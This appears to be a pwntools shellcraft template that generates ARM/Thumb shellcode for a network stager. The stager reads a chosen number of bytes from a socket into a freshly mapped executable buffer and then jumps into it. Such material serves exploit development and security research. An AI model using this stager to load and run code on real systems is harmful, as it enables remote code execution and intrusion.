<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import thumb, arm %>
<%docstring>
    stager(sock, size)

    Read 'size' bytes from 'sock' and place them in an executable buffer and jump to it.
    The socket will be left in r6.
</%docstring>
<%page args="sock, size"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
%>
${stager}:
    /* Save socket */
    ${thumb.mov('r6', sock)}

    ${arm.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', -1, 0)}

    /* Save allocated memory address */
    ${thumb.mov('r8', 'r0')}
    ${thumb.mov('r1', 'r0')}

    /* Initialize read loop counter */
    ${thumb.mov('r5', size)}
${looplabel}:
    ${arm.syscall('SYS_read', 'r6', 'r1', 'r5')}

    /* Update remaining count and write-address */
    add r1, r1, r0
    subs r5, r5, r0

    /* Anything left to read */
    bne ${looplabel}

    /* Jump to next stage */
    bx r8
